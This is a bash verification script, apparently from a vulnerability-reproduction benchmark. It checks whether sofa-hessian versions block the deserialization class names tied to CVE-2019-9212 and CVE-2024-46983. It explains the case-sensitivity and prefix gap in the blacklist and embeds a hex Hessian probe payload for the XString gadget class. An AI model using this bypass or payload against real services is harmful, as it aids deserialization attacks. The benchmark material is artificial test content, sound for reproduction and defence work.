#!/usr/bin/env bash
# verify.sh --seed|--residual — deser_sofahessian_blacklist
# （CVE-2019-9212 seed / CVE-2024-46983 residual）。
#
# 漏洞机制：REAL sofa-hessian ClassNameResolverBuilder.buildDefault() 的类名黑名单
# （security/serialize.blacklist，NameBlackListFilter case-sensitive startsWith 前缀匹配）在
# 反序列化前裁决类名放行/阻断；放行则服务回显 /canary/flag.txt 的 ${PCB_FLAG}。
#   seed    com.caucho.naming.Qname（9212 修复新增的黑名单条目本身）
#             v0(3.3.13) 无此条目 -> resolve 放行 -> flag 回显 rc=0
#             v1(3.5.4)  9212 修复含此条目 -> resolve 抛 blacklist -> 阻断 rc=10
#   residual com.sun.org.apache.xpath.internal.objects.XString（真实 Resin/JDK XString gadget 名）
#             v1(3.5.4)  9212 修复只写了小写 typo 条目 ...Xstring，且无 com.sun. 前缀
#                        -> 正确大小写的 XString 不匹配 -> 放行 -> flag 回显 rc=0
#             v2(3.5.5)  46983 修复改宽前缀 com.sun. -> 命中 -> 阻断 rc=10
# 效果通道 = HTTP 响应体（seed_exec.py 的 X 字段 = PCB_X 出现在响应体即命中）。
# 判定基准 = RUN_FLAG（canary 类；wrong/stale 检查时 RUN_FLAG 为注入容器的 override，
#            判定必须失败 -> 用 RUN_FLAG 而非 RUN_FLAG_REF）。
# 退出码：0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable

# probe <cand.json>：通过公开执行器 seed_exec.py 探测，返回 0/10/20
probe() {
  local cand="$1" out rc
  export PCB_X="$RUN_FLAG"   # seed_exec.py 模块级 X = PCB_X or PCB_FLAG；期望 flag 用 RUN_FLAG
  out="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$cand" "$VERSION" 2>&1)" || { echo "$out" >&2; return 20; }
  echo "$out" | head -c 500; echo
  "$PY" -c 'import json,sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
sys.exit(0 if d.get("X") == sys.argv[2] else 10)' "$out" "$RUN_FLAG"
  rc=$?
  echo "[probe $VERSION] flag_hit=$RUN_FLAG -> rc=$rc" >&2
  return $rc
}

rc=0
if [[ "$MODE" == "--seed" ]]; then
  # seed：CVE-2019-9212 — com.caucho.naming.Qname（9212 黑名单条目本身；v0 放行 / v1 阻断）
  "$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" > "$WORK_DIR/cand.json" 2>/dev/null \
    || "$PY" "$CASE_DIR/poc/original_poc.py" > "$WORK_DIR/cand.json" 2>/dev/null
  # flag placeholder replace (file-based)
  "$PY" - "$RUN_FLAG" "$WORK_DIR/cand.json" <<'ADAPTEOF'
import re, sys
flag, p = sys.argv[1], sys.argv[2]
s = open(p, encoding="utf-8", errors="replace").read()
s = re.sub(r'PCBFLAG_[A-Za-z0-9_]+', flag, s)
open(p, "w").write(s)
ADAPTEOF
  probe "$WORK_DIR/cand.json"; rc=$?
else
  # residual：CVE-2024-46983 — com.sun.org.apache.xpath.internal.objects.XString（真实 gadget 名；
  # 3.5.4 黑名单只有小写 typo 条目 ...Xstring 且无 com.sun. 前缀 -> 不匹配 -> v1 放行；
  # 3.5.5 才加宽前缀 com.sun. -> v2 阻断）。内嵌字面量（不引用 hidden 文件），与 seed 判定共用。
  printf '%s' '{"id": "cve-2024-46983-xstring_case_and_prefix_gap", "probe_class": "com.sun.org.apache.xpath.internal.objects.XString", "payload_hex": "4D740031636F6D2E73756E2E6F72672E6170616368652E78706174682E696E7465726E616C2E6F626A656374732E58537472696E670570726F6265530031636F6D2E73756E2E6F72672E6170616368652E78706174682E696E7465726E616C2E6F626A656374732E58537472696E677A"}' > "$WORK_DIR/cand.json"
  probe "$WORK_DIR/cand.json"; rc=$?
fi
echo "verify[$MODE] version=$VERSION rc=$rc (flag_ref=$RUN_FLAG)" >&2
exit "$rc"
